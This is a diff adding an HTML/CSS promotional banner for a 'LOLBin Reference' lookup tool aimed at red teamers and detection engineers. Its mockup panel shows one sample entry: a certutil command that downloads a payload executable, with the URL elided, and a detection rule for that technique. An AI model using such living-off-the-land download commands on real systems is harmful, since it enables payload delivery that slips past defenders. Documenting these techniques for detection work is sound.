@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    width: 1400px; height: 560px;
+    overflow: hidden;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: radial-gradient(circle at 82% 15%, #1c2b1c 0%, #14181c 40%, #0b0d0f 100%);
+    position: relative;
+  }
+  .grid-overlay {
+    position: absolute; inset: 0;
+    background-image:
+      linear-gradient(rgba(79,195,247,0.05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(79,195,247,0.05) 1px, transparent 1px);
+    background-size: 28px 28px;
+  }
+  .glow {
+    position: absolute;
+    width: 640px; height: 640px;
+    right: -140px; top: -160px;
+    background: radial-gradient(circle, rgba(79,195,247,0.18) 0%, rgba(79,195,247,0) 70%);
+  }
+  .glow2 {
+    position: absolute;
+    width: 500px; height: 500px;
+    left: -120px; bottom: -180px;
+    background: radial-gradient(circle, rgba(245,124,0,0.10) 0%, rgba(245,124,0,0) 70%);
+  }
+  .wrap {
+    position: relative;
+    width: 1400px; height: 560px;
+    display: flex;
+    align-items: center;
+    padding: 0 80px;
+    gap: 64px;
+  }
+  .left { flex: 1.1; }
+  .brand-row {
+    display: flex;
+    align-items: center;
+    gap: 22px;
+    margin-bottom: 22px;
+  }
+  .icon { width: 88px; height: 88px; border-radius: 18px; }
+  .title {
+    font-size: 46px;
+    font-weight: 800;
+    color: #ffffff;
+    letter-spacing: -0.5px;
+    line-height: 1.1;
+  }
+  .title .accent { color: #4fc3f7; }
+  .subtitle {
+    font-size: 22px;
+    color: #aebcc4;
+    font-weight: 500;
+    max-width: 560px;
+    line-height: 1.4;
+    margin-bottom: 22px;
+  }
+  .pill-row { display: flex; gap: 12px; margin-bottom: 8px; }
+  .pill {
+    font-size: 15px;
+    font-weight: 700;
+    padding: 7px 16px;
+    border-radius: 24px;
+    color: #fff;
+    letter-spacing: 0.3px;
+  }
+  .pill.win { background: #0078d4; }
+  .pill.linux { background: #f57c00; }
+  .pill.count { background: #263826; color: #7ee787; border: 1px solid #3a5a3a; }
+  .pill.offline { background: #2a2a3a; color: #b3b3ff; border: 1px solid #46468a; }
+
+  .right {
+    flex: 1;
+    background: #17181a;
+    border: 1px solid #2c2c2c;
+    border-radius: 14px;
+    box-shadow: 0 30px 80px rgba(0,0,0,0.45);
+    overflow: hidden;
+  }
+  .mock-header {
+    background: #111;
+    padding: 14px 20px 10px;
+    border-bottom: 2px solid #2a2a2a;
+  }
+  .mock-header h2 {
+    margin: 0 0 8px 0;
+    font-size: 18px;
+    color: #4fc3f7;
+    font-weight: 700;
+  }
+  .mock-filters { display: flex; gap: 6px; }
+  .mock-filters span {
+    font-size: 12px;
+    padding: 4px 12px;
+    border-radius: 4px;
+    background: #2a2a2a;
+    color: #ccc;
+    border: 1px solid #444;
+  }
+  .mock-filters span.active { background: #4fc3f7; color: #000; font-weight: 700; }
+  .mock-search {
+    padding: 12px 20px;
+    background: #232323;
+    color: #eee;
+    font-size: 14px;
+    border-bottom: 1px solid #333;
+  }
+  .mock-entry {
+    margin: 14px 18px;
+    background: #202020;
+    border: 1px solid #333;
+    border-radius: 8px;
+    padding: 12px 14px;
+  }
+  .mock-entry-header { display: flex; justify-content: space-between; align-items: center; }
+  .mock-entry-name { color: #4fc3f7; font-weight: 700; font-size: 15px; }
+  .mock-os { font-size: 10px; padding: 2px 8px; border-radius: 4px; color: #fff; font-weight: 700; }
+  .mock-os.win { background: #0078d4; }
+  .mock-desc { color: #ccc; font-size: 12px; margin: 6px 0; }
+  .mock-cmd {
+    background: #111; border: 1px solid #333; border-radius: 4px;
+    padding: 6px 10px; font-family: Consolas, monospace; font-size: 11px; color: #7ee787;
+  }
+  .mock-detect {
+    margin-top: 6px; padding: 6px 8px; background: #1a2a1a;
+    border-left: 3px solid #4caf50; font-size: 11px; color: #a5d6a7;
+  }
+</style>
+</head>
+<body>
+  <div class="grid-overlay"></div>
+  <div class="glow"></div>
+  <div class="glow2"></div>
+  <div class="wrap">
+    <div class="left">
+      <div class="brand-row">
+        <img class="icon" src="data:image/png;base64,__ICON_B64__" />
+        <div class="title">LOLBin <span class="accent">Reference</span></div>
+      </div>
+      <div class="subtitle">
+        Instant lookup for Living-off-the-Land Binaries during authorized red team engagements
+        &amp; detection engineering — searchable, offline, and free.
+      </div>
+      <div class="pill-row">
+        <span class="pill win">WINDOWS LOLBAS</span>
+        <span class="pill linux">LINUX GTFOBINS</span>
+      </div>
+      <div class="pill-row">
+        <span class="pill count">142 curated techniques</span>
+        <span class="pill offline">Works fully offline</span>
+      </div>
+    </div>
+    <div class="right">
+      <div class="mock-header">
+        <h2>🛡️ LOLBin Reference</h2>
+        <div class="mock-filters">
+          <span class="active">All</span><span>Windows</span><span>Linux</span>
+        </div>
+      </div>
+      <div class="mock-search">🔍 certutil</div>
+      <div class="mock-entry">
+        <div class="mock-entry-header">
+          <span class="mock-entry-name">certutil.exe</span>
+          <span class="mock-os win">windows</span>
+        </div>
+        <div class="mock-desc">Native certificate utility abusable for downloading files or decoding/encoding base64 payloads.</div>
+        <div class="mock-cmd">certutil -urlcache -split -f http://... payload.exe</div>
+        <div class="mock-detect">🛡️ Alert on certutil.exe with '-urlcache' or '-decode' flags.</div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
